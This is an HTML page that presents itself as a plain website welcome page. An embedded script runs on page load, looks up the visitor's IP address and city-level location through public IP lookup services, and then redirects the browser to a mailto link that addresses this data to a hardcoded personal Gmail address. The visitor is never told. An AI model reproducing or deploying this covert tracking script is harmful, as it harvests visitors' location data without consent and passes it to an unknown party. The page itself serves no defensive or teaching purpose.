<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Our Website</title>
</head>
<body>
    <h1>Welcome to Our Website!</h1>
    <p>We hope you enjoy your visit.</p>

    <script>
        // Function to send email with location
        function sendEmailWithLocation(location) {
            var ip = location.ip;
            var country = location.country_name;
            var region = location.region_name;
            var city = location.city;
            var email = "imobilejordan@gmail.com";

            // Create email body
            var body = "IP Address: " + ip + "\n";
            body += "Country: " + country + "\n";
            body += "Region: " + region + "\n";
            body += "City: " + city;

            // Send email using mailto link
            window.location.href = "mailto:" + email + "?subject=User Location&body=" + encodeURIComponent(body);
        }

        // Function to get user's IP address
        function getIPAddress() {
            // Send request to IPify API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;
                    // Use IP address to get user's location
                    fetch('https://ipapi.co/' + ipAddress + '/json/')
                        .then(response => response.json())
                        .then(location => {
                            // Send email with location
                            sendEmailWithLocation(location);
                        });
                });
        }

        // Call getIPAddress function when the page loads
        getIPAddress();
    </script>
</body>
</html>
